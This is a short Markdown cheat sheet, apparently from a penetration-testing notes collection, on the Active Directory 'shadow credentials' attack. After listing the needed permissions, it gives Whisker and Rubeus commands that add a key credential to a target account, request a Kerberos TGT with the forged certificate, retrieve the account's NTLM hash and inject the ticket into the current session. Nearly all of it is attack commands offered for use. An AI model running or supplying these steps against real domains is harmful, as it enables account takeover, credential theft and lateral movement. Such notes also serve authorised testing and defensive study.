# Methodology
>1. User with GenericAll/GenericWrite on `msDS-KeyCredentialLink` (Key Admins and Enterprise Key Admins have it by default).
>2. Enumerate if the DC is atleast Windows 2016

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## Whisker
**Add shadow credential:**
```cmd
Whisker.exe add /target:supportXuser
```

**Request the TGT by leveraging the certificate:** 
```cmd
# Retrieve NTLM hash
Rubeus.exe asktgt /user:supportXuser /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW.... /password:"1OT0qAom3..." /domain:us.contoso.local /dc:US-DC.us.contoso.local /getcredentials /show /nowrap

# Pass the ticket
Rubeus.exe asktgt /user:supportXuser /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW.... /password:"1OT0qAom3..." /domain:us.contoso.local /dc:US-DC.us.contoso.local /getcredentials /show /nowrap /ptt
```

**Inject the TGT in the current session or use the NTLM hash:**
```cmd
Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...
```